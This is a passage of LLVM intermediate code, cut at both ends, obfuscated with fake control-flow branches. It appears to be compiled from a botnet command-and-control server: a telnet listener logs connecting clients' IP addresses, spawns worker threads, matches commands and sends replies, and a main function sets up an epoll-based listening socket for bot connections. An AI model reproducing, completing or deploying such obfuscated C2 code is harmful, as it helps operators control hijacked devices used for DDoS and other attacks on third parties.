  %4539 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4540 = call i64 @strlen(i8* %4539) #8
  %4541 = call i64 @send(i32 %4537, i8* %4538, i64 %4540, i32 16384)
  %4542 = icmp eq i64 %4541, -1
  br label %originalBB354

originalBB358alteredBB:                           ; preds = %originalBB358, %2971
  br label %originalBB358

originalBB362alteredBB:                           ; preds = %originalBB362, %3052
  br label %originalBB362

originalBB366alteredBB:                           ; preds = %originalBB366, %3075
  %4543 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4544 = call i32 (i8*, i8*, ...) @sprintf(i8* %4543, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.149, i32 0, i32 0)) #7
  %4545 = load i32, i32* %4, align 4
  %4546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4547 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4548 = call i64 @strlen(i8* %4547) #8
  %4549 = call i64 @send(i32 %4545, i8* %4546, i64 %4548, i32 16384)
  %4550 = icmp eq i64 %4549, -1
  br label %originalBB366

originalBB370alteredBB:                           ; preds = %originalBB370, %3100
  store i8* null, i8** %2, align 8
  br label %originalBB370

originalBB374alteredBB:                           ; preds = %originalBB374, %3133
  %4551 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4552 = call i8* @strstr(i8* %4551, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.152, i32 0, i32 0)) #8
  %4553 = icmp ne i8* %4552, null
  br label %originalBB374

originalBB378alteredBB:                           ; preds = %originalBB378, %3153
  %4554 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4555 = call i32 (i8*, i8*, ...) @sprintf(i8* %4554, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %4556 = load i32, i32* %4, align 4
  %4557 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4558 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4559 = call i64 @strlen(i8* %4558) #8
  %4560 = call i64 @send(i32 %4556, i8* %4557, i64 %4559, i32 16384)
  %4561 = icmp eq i64 %4560, -1
  br label %originalBB378

originalBB382alteredBB:                           ; preds = %originalBB382, %3210
  %4562 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4563 = call i8* @strstr(i8* %4562, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i32 0, i32 0)) #8
  %4564 = icmp ne i8* %4563, null
  br label %originalBB382

originalBB386alteredBB:                           ; preds = %originalBB386, %3230
  %4565 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4566 = call i32 (i8*, i8*, ...) @sprintf(i8* %4565, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.157, i32 0, i32 0)) #7
  %4567 = load i32, i32* %4, align 4
  %4568 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4569 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4570 = call i64 @strlen(i8* %4569) #8
  %4571 = call i64 @send(i32 %4567, i8* %4568, i64 %4570, i32 16384)
  %4572 = icmp eq i64 %4571, -1
  br label %originalBB386

originalBB390alteredBB:                           ; preds = %originalBB390, %3272
  %4573 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4574 = call i8* @strstr(i8* %4573, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #8
  %4575 = icmp ne i8* %4574, null
  br label %originalBB390

originalBB394alteredBB:                           ; preds = %originalBB394, %3292
  %4576 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4577 = call i32 (i8*, i8*, ...) @sprintf(i8* %4576, i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.161, i32 0, i32 0)) #7
  %4578 = load i32, i32* %4, align 4
  %4579 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4580 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4581 = call i64 @strlen(i8* %4580) #8
  %4582 = call i64 @send(i32 %4578, i8* %4579, i64 %4581, i32 16384)
  %4583 = icmp eq i64 %4582, -1
  br label %originalBB394

originalBB398alteredBB:                           ; preds = %originalBB398, %3323
  %4584 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4585 = call i32 (i8*, i8*, ...) @sprintf(i8* %4584, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.163, i32 0, i32 0)) #7
  %4586 = load i32, i32* %4, align 4
  %4587 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4588 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4589 = call i64 @strlen(i8* %4588) #8
  %4590 = call i64 @send(i32 %4586, i8* %4587, i64 %4589, i32 16384)
  %4591 = icmp eq i64 %4590, -1
  br label %originalBB398

originalBB402alteredBB:                           ; preds = %originalBB402, %3354
  %4592 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4593 = call i32 (i8*, i8*, ...) @sprintf(i8* %4592, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.165, i32 0, i32 0)) #7
  %4594 = load i32, i32* %4, align 4
  %4595 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4596 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4597 = call i64 @strlen(i8* %4596) #8
  %4598 = call i64 @send(i32 %4594, i8* %4595, i64 %4597, i32 16384)
  %4599 = icmp eq i64 %4598, -1
  br label %originalBB402

originalBB406alteredBB:                           ; preds = %originalBB406, %3379
  store i8* null, i8** %2, align 8
  br label %originalBB406

originalBB410alteredBB:                           ; preds = %originalBB410, %3396
  br label %originalBB410

originalBB414alteredBB:                           ; preds = %originalBB414, %3413
  %4600 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4601 = call i8* @strstr(i8* %4600, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.166, i32 0, i32 0)) #8
  %4602 = icmp ne i8* %4601, null
  br label %originalBB414

originalBB418alteredBB:                           ; preds = %originalBB418, %3433
  %4603 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4604 = call i32 (i8*, i8*, ...) @sprintf(i8* %4603, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.167, i32 0, i32 0)) #7
  %4605 = load i32, i32* %4, align 4
  %4606 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4607 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4608 = call i64 @strlen(i8* %4607) #8
  %4609 = call i64 @send(i32 %4605, i8* %4606, i64 %4608, i32 16384)
  %4610 = icmp eq i64 %4609, -1
  br label %originalBB418

originalBB422alteredBB:                           ; preds = %originalBB422, %3458
  store i8* null, i8** %2, align 8
  br label %originalBB422

originalBB426alteredBB:                           ; preds = %originalBB426, %3491
  %4611 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4612 = call i8* @strstr(i8* %4611, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.170, i32 0, i32 0)) #8
  %4613 = icmp ne i8* %4612, null
  br label %originalBB426

originalBB430alteredBB:                           ; preds = %originalBB430, %3511
  %4614 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4615 = call i32 (i8*, i8*, ...) @sprintf(i8* %4614, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.171, i32 0, i32 0)) #7
  %4616 = load i32, i32* %4, align 4
  %4617 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4618 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4619 = call i64 @strlen(i8* %4618) #8
  %4620 = call i64 @send(i32 %4616, i8* %4617, i64 %4619, i32 16384)
  %4621 = icmp eq i64 %4620, -1
  br label %originalBB430

originalBB434alteredBB:                           ; preds = %originalBB434, %3537
  br label %originalBB434

originalBB438alteredBB:                           ; preds = %originalBB438, %3569
  %4622 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4623 = call i8* @strstr(i8* %4622, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i32 0, i32 0)) #8
  %4624 = icmp ne i8* %4623, null
  br label %originalBB438

originalBB442alteredBB:                           ; preds = %originalBB442, %3634
  br label %originalBB442

originalBB446alteredBB:                           ; preds = %originalBB446, %3664
  store i8* null, i8** %2, align 8
  br label %originalBB446

originalBB450alteredBB:                           ; preds = %originalBB450, %3710
  store i8* null, i8** %2, align 8
  br label %originalBB450

originalBB454alteredBB:                           ; preds = %originalBB454, %3727
  br label %originalBB454

originalBB458alteredBB:                           ; preds = %originalBB458, %3748
  %4625 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4626 = call i32 (i8*, i8*, ...) @sprintf(i8* %4625, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.187, i32 0, i32 0)) #7
  %4627 = load i32, i32* %4, align 4
  %4628 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4629 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4630 = call i64 @strlen(i8* %4629) #8
  %4631 = call i64 @send(i32 %4627, i8* %4628, i64 %4630, i32 16384)
  %4632 = icmp eq i64 %4631, -1
  br label %originalBB458

originalBB462alteredBB:                           ; preds = %originalBB462, %3775
  %4633 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4634 = call i8* @strstr(i8* %4633, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.188, i32 0, i32 0)) #8
  %4635 = icmp ne i8* %4634, null
  br label %originalBB462

originalBB466alteredBB:                           ; preds = %originalBB466, %3806
  %4636 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4637 = call i8* @strstr(i8* %4636, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0)) #8
  %4638 = icmp ne i8* %4637, null
  br label %originalBB466

originalBB470alteredBB:                           ; preds = %originalBB470, %3837
  %4639 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4640 = call i8* @strstr(i8* %4639, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i32 0, i32 0)) #8
  %4641 = icmp ne i8* %4640, null
  br label %originalBB470

originalBB474alteredBB:                           ; preds = %originalBB474, %3867
  br label %originalBB474

originalBB478alteredBB:                           ; preds = %originalBB478, %3897
  store i8* null, i8** %2, align 8
  br label %originalBB478

originalBB482alteredBB:                           ; preds = %originalBB482, %3914
  br label %originalBB482

originalBB486alteredBB:                           ; preds = %originalBB486, %3935
  %4642 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4643 = call i32 (i8*, i8*, ...) @sprintf(i8* %4642, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.197, i32 0, i32 0)) #7
  %4644 = load i32, i32* %4, align 4
  %4645 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4646 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4647 = call i64 @strlen(i8* %4646) #8
  %4648 = call i64 @send(i32 %4644, i8* %4645, i64 %4647, i32 16384)
  %4649 = icmp eq i64 %4648, -1
  br label %originalBB486

originalBB490alteredBB:                           ; preds = %originalBB490, %3960
  store i8* null, i8** %2, align 8
  br label %originalBB490

originalBB494alteredBB:                           ; preds = %originalBB494, %3982
  %4650 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4651 = call i32 (i8*, i8*, ...) @sprintf(i8* %4650, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.199, i32 0, i32 0)) #7
  %4652 = load i32, i32* %4, align 4
  %4653 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4654 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4655 = call i64 @strlen(i8* %4654) #8
  %4656 = call i64 @send(i32 %4652, i8* %4653, i64 %4655, i32 16384)
  %4657 = icmp eq i64 %4656, -1
  br label %originalBB494

originalBB498alteredBB:                           ; preds = %originalBB498, %4007
  store i8* null, i8** %2, align 8
  br label %originalBB498

originalBB502alteredBB:                           ; preds = %originalBB502, %4030
  %4658 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4659 = call i8* @strstr(i8* %4658, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.201, i32 0, i32 0)) #8
  %4660 = icmp ne i8* %4659, null
  br label %originalBB502

originalBB506alteredBB:                           ; preds = %originalBB506, %4056
  %4661 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4662 = call i8* @strstr(i8* %4661, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.203, i32 0, i32 0)) #8
  %4663 = icmp ne i8* %4662, null
  br label %originalBB506

originalBB510alteredBB:                           ; preds = %originalBB510, %4082
  %4664 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4665 = call i8* @strstr(i8* %4664, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.205, i32 0, i32 0)) #8
  %4666 = icmp ne i8* %4665, null
  br label %originalBB510

originalBB514alteredBB:                           ; preds = %originalBB514, %4120
  %4667 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4668 = call i64 @strlen(i8* %4667) #8
  %4669 = icmp eq i64 %4668, 0
  br label %originalBB514

originalBB518alteredBB:                           ; preds = %originalBB518, %4140
  br label %originalBB518

originalBB522alteredBB:                           ; preds = %originalBB522, %4181
  %4670 = load i32, i32* %4, align 4
  %4671 = sext i32 %4670 to i64
  %4672 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %4671
  %4673 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %4672, i32 0, i32 1
  store i32 0, i32* %4673, align 4
  %4674 = load i32, i32* %4, align 4
  %4675 = call i32 @close(i32 %4674)
  %4676 = load volatile i32, i32* @managesConnected, align 4
  %_523 = shl i32 %4676, -1
  %_524 = shl i32 %4676, -1
  %_525 = sub i32 %4676, -1
  %gen526 = mul i32 %_525, -1
  %_527 = sub i32 0, %4676
  %gen528 = add i32 %_527, -1
  %4677 = add nsw i32 %4676, -1
  store volatile i32 %4677, i32* @managesConnected, align 4
  br label %originalBB522

originalBB532alteredBB:                           ; preds = %originalBB532, %4206
  %4678 = load i8*, i8** %2, align 8
  br label %originalBB532
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

declare i32 @resolve(...) #1

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %31

; <label>:14:                                     ; preds = %1
  %15 = load i32, i32* @x.19
  %16 = load i32, i32* @y.20
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.207, i32 0, i32 0))
  %23 = load i32, i32* @x.19
  %24 = load i32, i32* @y.20
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %31

; <label>:31:                                     ; preds = %originalBBpart2, %1
  %32 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %32, i8 0, i64 16, i32 4, i1 false)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %35 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %34, i32 0, i32 0
  store i32 0, i32* %35, align 4
  %36 = load i32, i32* %3, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #9
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = load i32, i32* %4, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @bind(i32 %40, %struct.sockaddr* %41, i32 16) #7
  %43 = icmp slt i32 %42, 0
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %31
  %45 = load i32, i32* @x.19
  %46 = load i32, i32* @y.20
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  call void @perror(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.208, i32 0, i32 0))
  %53 = load i32, i32* @x.19
  %54 = load i32, i32* @y.20
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %61

; <label>:61:                                     ; preds = %originalBBpart24, %31
  %62 = load i32, i32* %4, align 4
  %63 = call i32 @listen(i32 %62, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %64

; <label>:64:                                     ; preds = %101, %61
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.209, i32 0, i32 0))
  %66 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %67 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %66, i32 0, i32 0
  %68 = load i64, i64* %67, align 4
  %69 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %66, i32 0, i32 1
  %70 = load i64, i64* %69, align 4
  call void @client_addr(i64 %68, i64 %70)
  %71 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %71, %struct._IO_FILE** %9, align 8
  %72 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %74 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 4
  %76 = and i32 %75, 255
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %78 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %77, i32 0, i32 0
  %79 = load i32, i32* %78, align 4
  %80 = and i32 %79, 65280
  %81 = lshr i32 %80, 8
  %82 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %83 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %82, i32 0, i32 0
  %84 = load i32, i32* %83, align 4
  %85 = and i32 %84, 16711680
  %86 = lshr i32 %85, 16
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %88 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %87, i32 0, i32 0
  %89 = load i32, i32* %88, align 4
  %90 = and i32 %89, -16777216
  %91 = lshr i32 %90, 24
  %92 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %72, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.211, i32 0, i32 0), i32 %76, i32 %81, i32 %86, i32 %91)
  %93 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %94 = call i32 @fclose(%struct._IO_FILE* %93)
  %95 = load i32, i32* %4, align 4
  %96 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %97 = call i32 @accept(i32 %95, %struct.sockaddr* %96, i32* %6)
  store i32 %97, i32* %5, align 4
  %98 = load i32, i32* %5, align 4
  %99 = icmp slt i32 %98, 0
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %64
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.212, i32 0, i32 0))
  br label %101

; <label>:101:                                    ; preds = %100, %64
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = inttoptr i64 %103 to i8*
  %105 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %104) #7
  br label %64
                                                  ; No predecessors!
  %107 = load i8*, i8** %2, align 8
  ret i8* %107

originalBBalteredBB:                              ; preds = %originalBB, %14
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.207, i32 0, i32 0))
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  call void @perror(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.208, i32 0, i32 0))
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = load i32, i32* @x.21
  %5 = load i32, i32* @y.22
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8**, align 8
  %15 = alloca i8**, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %struct.epoll_event, align 1
  %20 = alloca i8*, align 8
  store i32 0, i32* %12, align 4
  store i32 %0, i32* %13, align 4
  store i8** %1, i8*** %14, align 8
  store i8** %2, i8*** %15, align 8
  %21 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %22 = load i32, i32* %13, align 4
  %23 = icmp ne i32 %22, 4
  %24 = load i32, i32* @x.21
  %25 = load i32, i32* @y.22
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %38

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %34 = load i8**, i8*** %14, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %33, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.213, i32 0, i32 0), i8* %36)
  call void @exit(i32 1) #10
  unreachable

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i8**, i8*** %14, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 3
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @atoi(i8* %41) #8
  store i32 %42, i32* %18, align 4
  %43 = load i8**, i8*** %14, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 2
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @atoi(i8* %45) #8
  store i32 %46, i32* %17, align 4
  %47 = load i32, i32* %17, align 4
  %48 = icmp sgt i32 %47, 1000
  br i1 %48, label %49, label %51

; <label>:49:                                     ; preds = %38
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.214, i32 0, i32 0))
  ret i32 0

; <label>:51:                                     ; preds = %38
  %52 = load i32, i32* @x.21
  %53 = load i32, i32* @y.22
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %51
  %60 = load i32, i32* %17, align 4
  %61 = icmp slt i32 %60, 1000
  %62 = load i32, i32* @x.21
  %63 = load i32, i32* @y.22
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %61, label %70, label %72

; <label>:70:                                     ; preds = %originalBBpart24
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0))
  br label %72

; <label>:72:                                     ; preds = %70, %originalBBpart24
  %73 = load i32, i32* @x.21
  %74 = load i32, i32* @y.22
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %72
  %81 = load i32, i32* @x.21
  %82 = load i32, i32* @y.22
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %89

; <label>:89:                                     ; preds = %originalBBpart28
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.215, i32 0, i32 0))
  %91 = load i8**, i8*** %14, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 1
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @create_and_bind(i8* %93)
  store volatile i32 %94, i32* @listenFD, align 4
  %95 = load volatile i32, i32* @listenFD, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %89
  call void @abort() #10
  unreachable

; <label>:98:                                     ; preds = %89
  %99 = load i32, i32* @x.21
  %100 = load i32, i32* @y.22
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %98
  %107 = load volatile i32, i32* @listenFD, align 4
  %108 = call i32 @make_socket_non_blocking(i32 %107)
  store i32 %108, i32* %16, align 4
  %109 = load i32, i32* %16, align 4
  %110 = icmp eq i32 %109, -1
  %111 = load i32, i32* @x.21
  %112 = load i32, i32* @y.22
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %110, label %119, label %136

; <label>:119:                                    ; preds = %originalBBpart212
  %120 = load i32, i32* @x.21
  %121 = load i32, i32* @y.22
